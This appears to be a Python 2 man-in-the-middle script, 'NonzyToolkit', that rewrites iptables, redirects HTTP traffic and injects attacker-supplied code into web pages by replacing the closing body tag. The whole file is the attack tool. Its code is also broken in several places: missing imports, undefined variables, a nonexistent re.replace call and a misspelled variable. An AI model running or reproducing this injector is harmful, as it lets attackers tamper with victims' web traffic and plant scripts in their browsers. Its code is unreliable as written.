#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import optparse
import pyfiglet 
from termcolor import colored

banner = pyfiglet.figlet_format("NonzyToolkit")
print colored("=" * 60, "green")
print colored(banner, "yellow")
print colored("=" * 60, "green")

flush_iptable = "iptables --flush"
subprocess.call([flush_iptable])

iptables_rule1 = "iptables -I OUTPUT -j NFQUEUE --queue-num 0"
subprocess.call([iptables_rule1])

iptables_rule2 = "iptables -I INPUT -j NFQUEUE --queue-num 0"
subprocess.call([iptables_rule2])

iptables_rule3 = "iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000"
subprocess.call([iptables_rule3])

forward_connection = "echo 1> /proc/sys/net/ipv4/ip_forward"
subprocess.call([forward_connection])

#function to parse on terminal.....
def get_arguments():
	parser = optparse.OptionParser()
	parser.add_option("-c", "--code", dest="code", help="injection code")
	(options, arguments) = parser.parse_args()
		
	if not options.code:
		parser.error("An Injection code is reqiured")	

	return options

def set_load(packet,load):
	packet[scapy.Raw].load = load
	
	del scapy_packet[scapy.IP].len
	del scapy_packet[scapy.IP].chksum
	del scapy_packet[scapy.TCP].chksum
	return packet
			
def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.Raw):
		load = scapy_packet[scapy.Raw].load	
		if scapy_packet[scapy.TCP].dport == 10000:
			print colored("[-]Request >>>", "yellow")
			load = re.sub("Accept-Encoding:.*?\\r\n", "", load)
			load = re.replace("HTTP/1.1", "HTTP/1.0")

		elif scapy_packet[scapy.TCP].sport == 10000:
			print colored("[+]Injecting code >>>", "green")
			injection_code = options.code
			load = load.replace("</body>",injection_code)
			content_lenght_search = re.search("(?:Content-Length:\s)(\d*)", load)

			if content_length_search and "text/html" in load:
				content_length = content_length_search.group(1)
				new_content_length = int(content_length) + len(injection_code)
				load = load.replace(content_length, str(new_content_length))

		if load != scapy_packet[scapy.Raw].load:				
			new_packet = set_load(scapy_packet, load)
			packet.set_payload(str(new_packet))
		
	packet.accept()

options.get_arguments()
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()